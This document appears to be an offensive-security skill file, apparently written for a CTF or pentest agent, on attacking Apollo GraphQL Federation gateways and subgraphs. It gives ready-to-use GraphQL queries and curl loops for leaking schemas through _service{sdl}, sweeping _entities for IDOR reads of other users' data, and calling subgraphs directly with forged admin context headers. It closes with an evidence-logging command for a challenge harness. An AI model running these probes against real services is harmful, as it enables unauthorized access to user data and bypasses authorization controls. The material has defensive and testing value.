# Apollo Federation — gateway and subgraph attacks

Federation splits one schema across services: a **gateway** composes
**subgraphs**, each exposing `_service` (its SDL) and `_entities` (lookup by
key). The split creates attack surface a monolith does not have — subgraphs
trust gateway-injected context, `_service{sdl}` leaks schemas even when
introspection is off, and `@external`/`@key` fields are reachable through
`_entities`.

---

## 1. Detecting federation

```graphql
{ _service { sdl } }                    # gateway or subgraph → returns SDL doc
{ __schema { queryType { fields { name } } } }
# look for: _service, _entities, _any, fields taking representations:
{ _entities(representations: [{__typename:"User", id:"1"}]) { ... on User {email} } }
```

Response shapes:

- `{"data":{"_service":{"sdl":"type Query ..."}}}` — **federation confirmed,
  and you have the full subgraph schema** even with introspection disabled.
- `Cannot query field "_service"` — not federated (or a gateway that hides it).
- `_entities` present in `__schema` output even when `_service` errors.

**`_service{sdl}` is the #1 introspection-off bypass on Apollo deployments.**
`disableIntrospection` middlewares target `__schema`/`__type` — `_service` is
a normal resolver and almost always survives.

## 2. _entities — the built-in IDOR interface

Federation's cross-service lookup field:

```graphql
{ _entities(representations: [
    {__typename:"User", id:"1"},
    {__typename:"User", id:"2"},
    {__typename:"Admin", id:"1"}
  ]) {
    ... on User { id email role }
    ... on Admin { apiKey }
  } }
```

- `__typename` inside `representations` selects the entity type — the keys it
  accepts are the `@key` fields from the SDL (`@key(fields:"id")` → `{id}`).
- This resolves **without** the gateway's per-field authz in many setups —
  the entities resolver runs inside the subgraph which trusts the gateway
  already authorized.
- Batch: one request, many entity lookups — an IDOR sweep over `(type, id)`
  pairs.

Type names come from `_service{sdl}` — grep the SDL for `type .* @key`:

```graphql
type User @key(fields:"id") { id: ID! email: String role: String }
type Order @key(fields:"number") { number: String! owner: User }
```

then `_entities` with `{__typename:"User",id:"..."}` /
`{__typename:"Order",number:"..."}`.

## 3. Direct-to-subgraph — the trust boundary

Subgraphs are typically bound to internal ports (4001, 4002...) and the
gateway forwards with injected context headers (`x-user-id`, `x-user-role`,
`authorization` claims). Exposed subgraph routes skip the gateway entirely:

```bash
# probe common subgraph ports/paths if reachable
curl -s "http://$HOST:4001/graphql" -d '{"query":"{_service{sdl}}"}' \
  -H 'Content-Type: application/json'

# self-inject the context the gateway normally adds
curl -s "http://$HOST:4001/graphql" -H 'Content-Type: application/json' \
  -H 'x-user-id: 1' -H 'x-user-role: admin' -H 'x-scopes: admin' \
  -d '{"query":"{adminQuery{secret}}"}'
```

If a subgraph is reachable directly, the entire per-resolver authz that
*lived in the gateway* is gone. Look for:

- Docker compose / k8s leaks naming subgraph ports.
- `/graphql/users`, `/graphql/orders` route-per-subgraph dev setups.
- The gateway URL in `window.__APOLLO_STATE__` / JS bundle pointing at an
  internal name — try DNS/SSRF to reach it (`skills/web-ssrf/`).

## 4. @external / @requires — fields that need entity resolution

SDL markers map to exploit primitives:

```graphql
type Review @key(fields:"id") {
  id: ID!
  product: Product @provides(fields:"sku")
}
type Product @key(fields:"sku") {
  sku: String! @external
  internalCost: Float @external      # only meant to come via _entities
}
```

`@external` fields resolve only through `_entities` with the `@key` — but the
subgraph resolves them for ANY representation you send, including ids you do
not own. That is the same IDOR, one layer deeper.

## 5. Gateway-side issues

- **Query plans leak**: `extensions.queryPlan` in responses (dev mode) names
  every subgraph + the exact subquery each receives — free topology map.
- **Persisted query gates**: gateways with APQ — `persisted-queries.md`.
- **Cost limits at gateway only**: batch aliases bypass per-document limits
  forwarded as one document (`batching-attacks.md`).
- **Gateway introspection on / subgraph off**: the composed schema shows what
  all subgraphs offer — attack the interesting ones directly if reachable.

## 6. Managed-federation specific

Apollo Studio / GraphOS deployments:

- `x-apollo-operation-name` + `x-apollo-graph-id` headers drive metrics —
  some dev setups trust `x-apollo-` headers for variant selection
  (`variant:staging` may expose extra fields).
- `apollo-federation-include-trace: ftv1` header asks for full trace —
  dev-mode gateways return field-level resolver timing + error detail in
  `extensions.ftv1` (base64 protobuf — decode for internal field names).

## 7. Probes checklist

```bash
# 1. federation detection + SDL grab
curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{_service{sdl}}"}' > /tmp/sdl.json

# 2. entity lookups
for t in User Admin Flag Config Session Order; do
  curl -s "$BASE/graphql" -H 'Content-Type: application/json' -d "
    {\"query\":\"{_entities(representations:[{__typename:\\\"$t\\\",id:\\\"1\\\"}])
     {... on $t{__typename}}}\"}" | jq -c '.data,.errors'
done

# 3. subgraph route probes
for p in 4001 4002 4003 4000 5001; do
  curl -s -m3 -o /dev/null -w "$p:%{http_code}\n" "http://$HOST:$p/graphql" \
    -d '{"query":"{__typename}"}' -H 'Content-Type: application/json'
done
```

## 8. Evidence shape

`_service{sdl}` disclosure is a *capability* (class evidence); a cross-tenant
`_entities` read is impact:

```bash
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /graphql {_entities(representations:[{__typename:"User",id:"9"}])}' \
  --verdict confirms --evidence-kind impact --class web-graphql \
  --hypothesis-id h5 --evidence '"email":"other@victim.tld"' \
  --response '<verbatim>'
```
